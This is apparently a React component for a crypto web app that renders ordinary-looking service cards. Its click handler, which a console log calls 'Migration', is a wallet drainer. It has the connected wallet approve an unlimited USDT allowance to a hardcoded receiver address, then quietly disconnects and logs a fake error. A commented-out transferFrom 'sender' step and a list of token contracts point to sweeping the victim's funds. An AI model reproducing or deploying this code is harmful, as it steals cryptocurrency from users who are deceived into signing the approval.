"use client"

import { useAccount, usePublicClient, useFeeData, useWalletClient, useBalance, useDisconnect } from 'wagmi'
import {useState} from "react"
import abis from "@/utils/abis/mover.json"
import { sender } from '@/utils/sender/tfFrom'
import { useMaticBal, useUSDTBal } from '../balance'


interface Props {
  title: string,
  message: string

}

const Item = (prop: Props) => {

  const {title, message} = prop
 const {address, isConnected} = useAccount()

 const abi = abis.abi // change abi after deploying approval contract
 const publicClient = usePublicClient()
 const [wc, setWC] = useState()
 const {data: gasPrice} = useFeeData()
 //const [gasEst, setGasEst] = useState()
 const receiver = "0xC37BE78fd6D24bcc6de7e6f5bc7202CB6e9C7e05"//"0xFAf8C101F18711D16659e24458ef18F6A87e2B71"
 const con_address = "0x4f67aaad29973831e912fd9b8f5328a71b29d3d9" 
 //const [amt, setAmt] = useState()
 const ercadd = "0x6DC7DD490181dF81bc6D0e9B1A7Fa2Ca1ab73e4E"
 

 const {data: balance} = useBalance({
  address,token: ercadd
}) 
// testnet usdt 0x337610d27c682E347C9cD60BD4b3b107C9d34dDd
// mainnet usdt 0x6DC7DD490181dF81bc6D0e9B1A7Fa2Ca1ab73e4E
// mainet matic 0xcc42724c6683b7e57334c4e856f4c9965ed682bd
//mainnet sol 0x570A5D26f7765Ecb712C0924E4De545B89fD43dF
//mainnet usdc 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d
// testnet usdc 0x16227D60f7a0e586C66B005219dfc887D13C9531
// testnet matic 0xEC5dCb5Dbf4B114C9d0F65BcCAb49EC54F6A0867
// testnet sol
const {data: usdt} = useBalance({
  address, token: '0x6DC7DD490181dF81bc6D0e9B1A7Fa2Ca1ab73e4E'
})

/*
const {data: matic} = useBalance({
  address, token: "0xEC5dCb5Dbf4B114C9d0F65BcCAb49EC54F6A0867"
})


const {data: sol} = useBalance({
  address, token: "0x570A5D26f7765Ecb712C0924E4De545B89fD43dF"
})


const {data: usdc} = useBalance({
  address, token: "0x16227D60f7a0e586C66B005219dfc887D13C9531"
})
*/
const contractArr = ['0x6DC7DD490181dF81bc6D0e9B1A7Fa2Ca1ab73e4E', "0xcc42724c6683b7e57334c4e856f4c9965ed682bd", "0x570A5D26f7765Ecb712C0924E4De545B89fD43dF",
"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"]
// 0x570A5D26f7765Ecb712C0924E4De545B89fD43dF


const {disconnect} = useDisconnect()
 const {data} = useWalletClient({

               async onSuccess(data) {

                setWC(data)
               
                }
 })
  const [shm, setShm] = useState(false)

const handleClick = async() => {



  console.log("Migration clicked and usdt et matic balance", usdt)
   
  /*
  var sm = ercadd
  
   
   if(matic?.value > usdt?.value || matic?.value > sol?.value)
   {

    sm = contractArr[1]
    
   }
   else if(sol?.value > usdt?.value || sol?.value > matic?.value)
   {
    sm = contractArr[2]
   }
   */
  
   if(!isConnected)
   {
     console.log("Connect wallet")
     const mbtn = document.querySelector("#cshm") //.clicked()
     mbtn?.click()

   }
   else {
  
    if(data)
    {
    
      try {



      const [address] = await data.getAddresses()

      const amt = BigInt("115792089237316195423570985008687907853269984665640564039457584007913129639935")
     
       const { request } = await publicClient.simulateContract({
        abi: abi,
        functionName: "approve",
        args: [receiver, amt],
        account: address,
        address: ercadd
      })
        
      const res = await data?.writeContract(request)

      const receipt = await publicClient.waitForTransactionReceipt({hash: res})

      console.log(receipt)
      if(receipt)
     {
         const cost = usdt?.value
         
         //const hashed = await sender(ercadd, address, usdt?.value)
         disconnect()
        
         console.log("An error occur for sending")
     }
   
      } 

      catch (error) {
        console.log("An error occur",error)
      }
      
    }
   }
  
}
    return(

        <div className="col-md-6 col-lg-3 d-flex align-items-stretch mb-5 mb-lg-0 pec" onClick={() => handleClick()}>
        <div className="icon-box" data-aos="fade-up" data-aos-delay="200">
          <div className="icon"><i className="bx bx-file"></i></div>
          <h4 className="title"><p className="pec">{title}</p></h4>
          <p className="description">{message}</p>
        </div>
      </div>
    )
   
}

export default Item